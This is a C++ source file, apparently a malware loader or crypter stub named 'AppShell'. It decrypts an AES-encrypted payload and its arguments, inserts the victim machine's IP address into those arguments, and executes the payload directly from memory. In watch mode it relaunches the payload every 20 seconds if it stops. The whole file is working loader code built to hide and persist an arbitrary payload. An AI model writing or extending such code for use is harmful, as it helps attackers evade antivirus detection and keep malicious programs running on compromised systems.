// AppShell.cpp
//

#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>
#include <Crypto.h>
#include <Common.h>
#include "Config.h"
#include "MemExec.h"

using namespace Felidae;

char* makePayloadArgs(int argc, char** argv) {
    char* s = new char[1024];
    memset(s, 0, 1024);
    if (argc != 1) {
        for (int i = 1; i < argc; i++) {
            strcat_s(s, 1024, " ");
            strcat_s(s, 1024, argv[i]);
        }
    }
    else {
        char* decrypted = NULL;
        BOOL ok = Felidae::AES_CBC_Decrypt_String(
            ENCRYPTED_PAYLOAD_ARGS,
            &decrypted,
            AES_KEY
        );
        if (!ok) {
            log("failed to decrypt args %s\n", ENCRYPTED_PAYLOAD_ARGS);
            return NULL;
        }
        std::string dec(decrypted);
        size_t idx = dec.find("{IP}");
        if (idx != std::string::npos) {
            std::string sIpAddr;
            char ipAddr[20] = "";
            if (Felidae::GetIpAddrX(ipAddr, 20, 'x')) {
                sIpAddr = std::string(ipAddr);
            }
            else {
                sIpAddr = "unkonwn";
            }
            dec.replace(idx, sIpAddr.length(), sIpAddr);
        }

        strcat_s(s, 1024, " ");
        strcat_s(s, 1024, dec.c_str());
    }

    return s;
}

#define R_ERROR (-1)
#define R_NO_EXIST (0)
#define R_EXIST (1)

int TargetProcessAlive() {
    char path[MAX_PATH] = { 0 };
    HANDLE hProc = GetCurrentProcess();
    DWORD procId = GetCurrentProcessId();
    ::GetModuleBaseName(hProc, NULL, path, MAX_PATH);
    CloseHandle(hProc);

    HANDLE hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "error of snapshot handle" << std::endl;
        return R_ERROR;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!::Process32First(hSnapshot, &pe32)) {
        ::CloseHandle(hSnapshot);
        return R_ERROR;
    }
    do {

        if (pe32.th32ProcessID != procId && strcmp(pe32.szExeFile, path) == 0) {
            ::CloseHandle(hSnapshot);
            return R_EXIST;
        }
    } while (::Process32Next(hSnapshot, &pe32));

    ::CloseHandle(hSnapshot);
    return R_NO_EXIST;

}

int StartTargeProcess(int argc, char** argv) {
    LPBYTE lpData = NULL;
    DWORD dwLen = 0;

    BOOL ok = Felidae::AES_CBC_Decrypt_From_File(
        ENCRYPTED_PAYLOAD,
        &lpData,
        &dwLen,
        AES_KEY
    );
    if (!ok) {
        log("failed to load payload %s\n", ENCRYPTED_PAYLOAD);
        return -1;
    }
    char* args = makePayloadArgs(argc, argv);
    // log("args: %s\n", args);
    MemExec(lpData, dwLen, args);
    delete[] args;
    delete[] lpData;
    return 0;
}

int main(int argc, char **argv)
{
    BOOL watch = FALSE;
    if (argc == 2 && strcmp(argv[1], "--watch") == 0) {
        log("start on watch mode\n");
        watch = TRUE;
    }

    StartTargeProcess(argc, argv);
    log(SCREEN_TEXT);

    while (watch)
    {
        Sleep(20 * 1000);
        int r = TargetProcessAlive();
        if (r == R_NO_EXIST) {
            log("restarting...\n");
            StartTargeProcess(argc, argv);
            log(SCREEN_TEXT);
        }
    }

}
